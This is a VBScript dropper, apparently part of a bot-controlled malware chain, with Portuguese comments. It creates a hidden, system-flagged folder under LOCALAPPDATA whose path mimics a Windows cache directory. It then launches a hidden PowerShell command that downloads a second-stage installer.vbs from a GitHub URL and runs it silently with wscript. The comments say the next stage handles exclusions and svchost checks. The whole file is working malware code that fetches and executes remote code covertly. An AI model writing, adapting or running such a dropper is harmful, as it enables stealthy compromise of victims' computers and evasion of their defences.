' movestinstall.vbs — baixa o installer.vbs pra pasta oculta do svchost e roda.
'
' Uso: chamado pelo comando CMD/PowerShell do bot.
' Ele só faz o download + move + executa o installer.vbs de verdade.
' Toda a lógica (exclusão, checar svchost, etc.) fica no installer.vbs.

Option Explicit

Dim shell, fso
Dim localAppData, destino, destinoVbs, installerUrl
Dim cmdBaixar, rc, tentativas

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' =====================================================================
' CONFIGURAÇÕES
' =====================================================================
installerUrl = "https://raw.githubusercontent.com/DesconhecidoPorOpcao/0T.romujaPnp/main/installer.vbs"

localAppData = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
destino      = localAppData & "\Microsoft\Windows\Caches\Local"
destinoVbs   = destino & "\installer.vbs"

' =====================================================================
' PASSO 1 — Cria a pasta (se não existir) e esconde.
' =====================================================================
On Error Resume Next
If Not fso.FolderExists(destino) Then
    fso.CreateFolder(destino)
End If
shell.Run "attrib +h +s """ & destino & """", 0, True
On Error Goto 0

' =====================================================================
' PASSO 2 — Baixa o installer.vbs pro destino.
' =====================================================================
cmdBaixar = "powershell -NoProfile -WindowStyle Hidden -Command ""try { " & _
            "Invoke-WebRequest -Uri '" & installerUrl & "' -OutFile '" & destinoVbs & "' " & _
            "-UseBasicParsing -ErrorAction Stop; exit 0 } catch { exit 1 }"""

rc = 1
On Error Resume Next
rc = shell.Run(cmdBaixar, 0, True)
On Error Goto 0

' =====================================================================
' PASSO 3 — Confere se o arquivo veio (>1KB) e roda escondido.
' =====================================================================
Dim tam
tam = 0
On Error Resume Next
If fso.FileExists(destinoVbs) Then
    tam = fso.GetFile(destinoVbs).Size
End If
On Error Goto 0

If tam > 1024 Then
    ' Roda o installer.vbs destacado, sem janela.
    On Error Resume Next
    shell.Run "wscript.exe //B """ & destinoVbs & """", 0, False
    On Error Goto 0
End If

WScript.Quit 0
